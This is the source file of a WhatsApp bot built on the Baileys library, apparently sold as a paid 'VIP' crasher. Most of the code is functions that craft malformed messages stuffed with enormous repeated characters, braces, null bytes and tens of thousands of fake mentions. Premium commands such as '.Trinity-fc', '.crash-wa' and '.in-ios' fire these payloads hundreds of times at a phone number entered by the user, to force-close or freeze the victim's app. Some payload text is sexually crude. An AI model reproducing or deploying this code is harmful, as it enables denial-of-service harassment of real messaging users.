//========HELO FRIEND========//
require('./config')
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const fs = require('fs-extra')
const util = require('util')
const chalk = require('chalk')
const { addPremiumUser, delPremiumUser } = require("./lib/premium");
const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
//===============
module.exports = rikz = async (rikz, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : "");
const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = q = args.join(" ")//hard
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
//======================
const botNumber = await rikz.decodeJid(rikz.user.id);
const premuser = JSON.parse(fs.readFileSync("./system/database/premium.json"));
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
if (!rikz.public && !isCreator) return;
//======================
const isGroup = m.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await rikz.groupMetadata(m.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(m.sender);
const groupName = groupMetadata.subject || "";
//======================
if (m.message) {
rikz.readMessages([m.key]);
console.log("┏━━━━━━━━━━━━━━━━━━━━━━━=");
console.log(`┃¤ ${chalk.hex("#FFD700").bold("📩 NEW MESSAGE")} ${chalk.hex("#00FFFF").bold(`[${new Date().toLocaleTimeString()}]`)} `);
console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Dari:")} ${chalk.hex("#FFFFFF")(`${m.pushName} (${m.sender})`)} `);
console.log(`┃¤ ${chalk.hex("#FFA500")("📍 Di:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
console.log(`┃¤ ${chalk.hex("#00FF00")("📝 Pesan:")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}
//FUNCTION BUG
async function XProtexHardCore(target) {
 try {
  const cards = [];
  const header = {
    videoMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0&mms3=true",
       mimetype: "video/mp4",
       fileSha256: "/pV21pNhkihyDh9p3Hq5wt7yhm8936pnjQqKre9lKpY=",
       fileLength: 3714175,
       seconds: 19,
       mediaKey: "LQ4w55EW8uoSwW/K7ejT0X++UhZIvP8pqrFkO7B/e50=",
       height: 576,
       width: 768,
       fileEncSha256: "BKuE23WWqS72GgIoJHmTGefyqUADW2hdeIlUBa15Oh4=",
       directPath: "/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0",
       mediaKeyTimestamp: "1751466051",
       jpegThumbnail: "",
       contextInfo: {},
       streamingSidecar: "ypvxlTyuR3uzb1giNyNVUaHeJ40v9lL2IjwfM8njf+m2lvqWGcKb6L6IRiH6TiajAWpnj2z4ZsC6klWL6l2NkB65g8U+qXMyjADFSGOuG9LBI/jmx7h9vlpXjSgxZOLVy29HBS2vhjj8V1IglDR47GrAz0UZqcDuotGa/vJmSg5lKMpxxJqzvJth0h4spVX2pcH2aIVZnWkaHh2a+7BukY6hXN1A/or+VvhZyauto6anYMWAcnACcWP9dyBKYa1B7Ss7Vnu86uqUbQmyyNgePCipB9sundP9iq4RHBiR1RxFfrv990U+hYUPE0kbBtD1zfK9x+gmf1I9Cav0sP64xnWQ8TrhalUjTE2mVFfQqn8ZkY4IKwOpOgWzacImLK6j0Pj78jyibNShmDBlmG61QOMKfwVW4ZDw3M7kI1/1TJ3uKBXYzLlAs36BowfErSIrgEbU+OSA1g2Ay4qwH+k5mjkOLVnW3dshIjCdxsHUTTLQpQGnBrh+sARmOWL8UHjJOKCh/7lQZqx3Vv7ZOt13ry44AR2aRPEO7VkYpX4oOWhKyjJIgHpZXPddrZLL3s/yGVecfpP9F80HfuB5ieery0Ai0klbruXlB9JDrd2w2477587Djifcsqqdqwurc6DTvWaEaTZTCsHMAyuQCOLIoTY0fWvotA7oIW/eVYb8LwdJzjzVbswVl4XoWkc+nJBKJFcQ7PE/kRKe6aWyqARaY/XxPUmLrEWPrqLbn1yY8a6yICH2dmq+3Sf5"
    }, 
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "XProtex" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "🧬⃟༑⌁⃰𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬ཀ͜͡🪅" + "ោ៝".repeat(10000),
          contextInfo: {
            mentionedJid: ["13135550202@s.whatsapp.net"],
            externalAdReply: {
              title: "{ 🧬⃟༑⌁⃰𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬ཀ͜͡🪅 }",
              body: "",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://nekopoi/care",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };
  
  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) // trigger 2
      }
    });
  }

  const msg2 = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "🧬⃟༑⌁⃰𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬ཀ͜͡🪅" + "ោ៝".repeat(10000),
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "XProtex" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
              externalAdReply: {
                title: "🧬⃟༑⌁⃰𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬ཀ͜͡🪅",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://XProtex-ai.example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );
  
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              questionMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "🧬⃟༑⌁⃰𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬ཀ͜͡🪅" + "ោ៝".repeat(10000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "{".repeat(20000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{".repeat(20000),
                }
              ]
            }
          }
        }
      }
    },
    {}
  );
  //relayMessagePertama  
  await rikz.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  //relayMessageKedua
  await rikz.relayMessage(target, msg2.message, {
    participant: { jid: target },
    messageId: msg2.key.id
  });
  
  console.log(chalk.red(`Succes Sending Bug FcHardCore To ${target}`));
 } catch (err) {
    console.error("Terdapat Kesalahan Pada Struktur Function", err);
    throw err;
  }
}
async function FloodUIxFC(target) {
  const floodXMention = [
    "0@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 5000 }, () =>
      "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
    ),
  ];

  for (let i = 0; i < 50; i++) {
    const mediaFlood = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "mau di entot zephyrine ga?😖",
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: floodXMention,
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING",
              },
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
          extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "mau di entot zephyrine ga?😖" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
      },
    };

    try {
      const msg = generateWAMessageFromContent(target, mediaFlood, {});
      await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
      });
    } catch (err) {
      console.error("Flood UI Force Close Error:", err);
    }
  }
}
async function sbh(target) {
  const sbh = [
    {
      tag: 'call',
      attrs: {
        from: client.user.id,
        to: true,
        id: '1234567890ABCDEF',
      },
      content: [
        {
          tag: 'offer',
          attrs: {
            'call-id': true,
            'call-creator': target,
          },
          content: true,
        }
      ]
    }
  ];

  const phynx = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '',
                  imageMessage: {
                    url: "https://img1.pixhost.to/images/7496/626054772_uploaded_image.jpg=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "99999999999",
                    height: 9999,
                    width: 9999,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: " ~ raldzz`executive ~ ",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "𑲭".repeat(61111)
                },
                footer: {
                  text: " 𝐖𝐀𝐌𝐙 𝐊𝐄𝐁𝐄𝐋𝐄𝐓 𝐄𝐄𝐊 𝐁𝐉𝐈𝐑 "
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(99999),
                  buttons: Array(99).fill({
                    name: "cta_call",
                    buttonParamsJson: JSON.stringify({
                      status: "𛀠" })
                  })
                }
              }
            ]
          },
          contextInfo: {
            stanzaId: client.generateMessageTag(),
            participant: target,
            remoteJid: "@s.whatsapp.net",
            mentionedJid: [ target,
            ...Array.from({ length: 35000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net` ) ],
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{".repeat(99999),
                      version: 3
                    }
                  }
                }
              }
            },
          }
        }
      }
    }
  }, {});

  await rikz.relayMessage(target, phynx.message, 
  {
    participant: { jid: target },
    additionalNodes: null,
    messageId: phynx.key.id
  });
  console.log(`SUCCESS SEND BUGS FORCECLOSE SBH`);
}

async function urlbugs(target) {
  try {
    await lalz.relayMessage(target, {
      locationMessage: {
        degreesLatitude: -9.09999262999,
        degreesLongitude: 199.99963118999,
        jpegThumbnail: null,
        name: "XrL ~ XxX" + "ꦽ".repeat(45000),
        address: "⟅ ▿ ⿻ XrL - ThubderX ⿻ ▿ ⟆",
        url: "https://xvideos.🩸" + "🩸".repeat(100000) + ".com"
      }
    }, {
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    });
  } catch (err) {
    console.log(err);
  }
}

async function protocolbug8(target, mention) {
  const photo = {
    image: { url: "https://img1.pixhost.to/images/6867/616928797_nier.png"},
    caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 666, // ubah ke 100 kalau g ke kirim
      expectedVideoCount: 0
    }
  }, {
    userJid: target,
    upload: lalz.waUploadToServer
  });

  await lalz.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) { // ubah ke 100 / 10 kalau g ke kirim
    const msg = await generateWAMessage(target, photo, {
      upload: lalz.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
      "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "Tama Ryuichi | I'm Beginner",
        newsletterJid: "0@newsletter",
        serverMessageId: 1
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    await lalz.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await lalz.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}

async function CrashIos(target) {
 
    await sock.relayMessage(
      target,
      {
        locationMessage: {
          degreesLatitude: 21.1266,
          degreesLongitude: -11.8199,
          name: " ‼️⃟𝕾𝖓𝒊𝖙̦̾𝖍͢ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱\n" + "\u0000".repeat(25000) + "𑇂𑆵𑆴𑆿".repeat(60000),
          url: "https://t.me/Snitchezs",
          contextInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: " ‼️⃟𝕾̷⃰𝖓𝒊𝖙̦͈͈͈͈̾𝖍͢ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱" + "𑇂𑆵𑆴𑆿".repeat(60000),
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      },
      {
        participant: { jid: target }
      }
    );
  }

//======================
switch (command) {
//case bug
case "Trinity-fc": {

if (!isPremium) return m.reply('Premium Only');

if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);

target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

m.reply(`*[!] ✅ Bug submitted successfully.

⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 

          for (let i = 0; i < 870; i++) {
           await XProtexHardCore(target)
           await XProtexHardCore(target)
           await XProtexHardCore(target)
           await XProtexHardCore(target)
           await XProtexHardCore(target)
           await XProtexHardCore(target)
           await XProtexHardCore(target)
        }
    }
    
break;
case "crash-wa": {

if (!isPremium) return m.reply('Premium Only');

if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);

target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

m.reply(`*[!] ✅ Bug submitted successfully.

⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 

          for (let i = 0; i < 870; i++) {
           await FloodUIxFC(target)
           await FloodUIxFC(target)
           await FloodUIxFC(target)
           await FloodUIxFC(target)
           await FloodUIxFC(target)
           await FloodUIxFC(target)
           await FloodUIxFC(target)
        }
    }
    
break;
case "in-blank": {

if (!isPremium) return m.reply('Premium Only');

if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);

target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

m.reply(`*[!] ✅ Bug submitted successfully.

⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 

          for (let i = 0; i < 870; i++) {
           await urlbugs(target)
           await urlbugs(target)
           await urlbugs(target)
           await urlbugs(target)
           await urlbugs(target)
           await urlbugs(target)
           await urlbugs(target)
        }
    }
    
break;
case "forclose": {
    
if (!isPremium) return m.reply('Premium Only');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234���`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*[!] ✅ Bug submitted successfully.

⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 
          for (let i = 0; i < 879; i++) {
           await sbh(target)
           await sbh(target)
           await sbh(target)
           await sbh(target)
           await sbh(target)
           await sbh(target)
           await sbh(target)
        }
    }
    
break;
case "protoxinfi": {
    
if (!isPremium) return m.reply('Premium Only');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234���`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*[!] ✅ Bug submitted successfully.

⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 
          for (let i = 0; i < 879; i++) {
           await protocolbug8(target)
           await protocolbug8(target)
           await protocolbug8(target)
           await protocolbug8(target)
           await protocolbug8(target)
           await protocolbug8(target)
           await protocolbug8(target)
        }
    }
    
break;
case "in-ios": {
    
if (!isPremium) return m.reply('Premium Only');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234���`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*[!] ✅ Bug submitted successfully.

⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 
          for (let i = 0; i < 879; i++) {
           await CrashIos(target)
           await CrashIos(target)
           await CrashIos(target)
           await CrashIos(target)
           await CrashIos(target)
           await CrashIos(target)
           await CrashIos(target)
        }
    }
    
break;
//======================
case 'public': {
if (!isCreator) return m.reply(mess.owner) 
if (rikz.public === true) return m.reply("*Succesfull Public Mode*");
rikz.public = true
m.reply(mess.succes)
}
break
//======================
case 'self': {
if (!isCreator) return m.reply(mess.owner) 
if (rikz.public === false) return m.reply("*Succesfull Self Mode*");
rikz.public = false
m.reply(mess.succes)
}
break
//======================
case "menu": {
let itsmenu = 
`

> 口 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗠𝗘𝗡𝗨 𝗧𝗥𝗜𝗡𝗜𝗧𝗬 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬𓃵

– 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 𝘽𝙊𝙏
❒  𝘽𝙤𝙩𝙣𝙖𝙢𝙚 : 𝗧𝗥𝗜𝗡𝗜𝗧𝗬 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬
❒  𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : 𝗔𝗿𝗰𝗮𝗻 𝗣𝗿𝗶𝗺𝗲
❒  𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : 1.0 𝙑𝙄𝙋 ( 𝘽𝙪𝙮 𝙊𝙣𝙡𝙮 ) 
❒  𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙊𝙒𝙉𝙀𝙍

" The book is a collection of books, and it is a collection of books. "
 

© 𝗦𝗶𝗺𝗽𝗹𝗲 𝗕𝗼𝘁 𝗧𝗿𝗶𝗻𝗶𝘁𝘆
– Want to see the bug menu? Type .bugmenu (to show the bug menu)
   
– Want to see all menus? Type .allmenu (to show all menus)
© 𝗦𝗶𝗺𝗽𝗹𝗲 𝗕𝗼𝘁 𝗧𝗿𝗶𝗻𝗶𝘁𝘆


© 𝗧𝗿𝗶𝗻𝗶𝘁𝘆 𝗫𝘅
https://ẉ.ceo/KyyOffc

`;
await rikz.sendMessage(m.chat, {
image: { url: "https://files.catbox.moe/8je0we.jpeg" },
caption: itsmenu
}, { quoted: m });
}
break; 

case "bugmenu": {
let itsmenu = 
`

> 口 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 𝗕𝘂𝗴𝗺𝗲𝗻𝘂 𝗧𝗥𝗜𝗡𝗜𝗧𝗬 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬𓃵

– 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 𝘽𝙊𝙏
❒  𝘽𝙤𝙩𝙣𝙖𝙢𝙚 : 𝗧𝗥𝗜𝗡𝗜𝗧𝗬 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬
❒  𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : 𝗔𝗿𝗰𝗮𝗻 𝗣𝗿𝗶𝗺𝗲
❒  𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : 1.0 𝙑𝙄𝙋 ( 𝘽𝙪𝙮 𝙊𝙣𝙡𝙮 ) 
❒  𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙊𝙒𝙉𝙀𝙍

" 𝑇𝑖𝑑𝑎𝑘 𝑎𝑑𝑎 𝑘𝑎𝑡𝑎 𝑡𝑒𝑟𝑙𝑎𝑚𝑏𝑎𝑡 𝑢𝑛𝑡𝑢𝑘 𝑚𝑒𝑛𝑗𝑎𝑑𝑖 𝑙𝑒𝑏𝑖ℎ 𝑏𝑎𝑖𝑘 "


– 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐
➛ .Trinity-fc 234xxx
     ( bug forclose whatsapp ori ) 

➛ .crash-wa 234xxx
     ( bug forclose / ui whatsapp ) 

➛ .forclose 234xxx
     ( bug forclose all whatsapp ) 
     
➛ .in-blank 234xxx
      ( bug blank ui whatsapp ) 
      
 ➛ .protoxinfi 234xxx
      ( bug protocol WhatsApp )
      
➛ .in-ios 234xxx
       ( bug fc ios whatsapp )


© 𝗞𝘆𝘆 𝗖𝗿𝗮𝘀𝗵𝗲𝗿
https://ẉ.ceo/KyyOffc

`;
await rikz.sendMessage(m.chat, {
image: { url: "https://files.catbox.moe/8je0we.jpeg" },
caption: itsmenu
}, { quoted: m });
}
break;

case "allmenu": {
let itsmenu = 
`

> 口 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 𝗧𝗥𝗜𝗡𝗜𝗧𝗬 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬𓃵

– 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 𝘽𝙊𝙏
❒  𝘽𝙤𝙩𝙣𝙖𝙢𝙚 : 𝗧𝗥𝗜𝗡𝗜𝗧𝗬 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬
❒  𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : 𝗔𝗿𝗰𝗮𝗻 𝗣𝗿𝗶𝗺𝗲
❒  𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : 1.0 𝙑𝙄𝙋 ( 𝘽𝙪𝙮 𝙊𝙣𝙡𝙮 ) 
❒  𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙊𝙒𝙉𝙀𝙍

" 𝐸𝑛𝑔𝑘𝑎𝑢 𝑡𝑖𝑑𝑎𝑘 𝑏𝑒𝑟𝑠𝑒𝑛𝑑𝑖𝑟𝑖𝑎𝑛 "


– 𝙊𝙒𝙉𝙀𝙍 𝙈𝙀𝙉𝙐
➛ .addprem
     ( add bot owner )
     
➛ .delprem
      ( delete bot owner)



– 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐
➛ .Trinity-fc 234xxx
     ( bug forclose whatsapp ) 

➛ .crash-wa 234xxx
     ( bug forclose / ui whatsapp ) 

➛ .forclose 234xxx
     ( bug forclose all whatsapp ) 
     
➛ .in-blank 234xxx
      ( bug blank ui whatsapp ) 
      
➛ .protoxinfi 234xxx
      ( bug protocol WhatsApp )
      
➛ .in-ios 234xxx
       ( bug fc ios whatsapp )
 

© 𝐀𝐫𝐜𝐚𝐧 𝐏𝐫𝐢𝐦𝐞.
*t.me/darkempdev
wa.me/234xxxx


`;
await rikz.sendMessage(m.chat, {
image: { url: "https://files.catbox.moe/8je0we.jpeg" },
caption: itsmenu
}, { quoted: m });
}
break; 

//======================
case "addprem": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: .addprem (number)");
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
m.reply(`✅ Succesfull addprem:\n• ${user} (30 days)`)}
break;
//======================
case "delprem": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: .delprem (number)");
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
m.reply(removed ? `✅ Succesfull delprem:\n• ${user}` : "❌ User not found")}
break;
//======================
default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}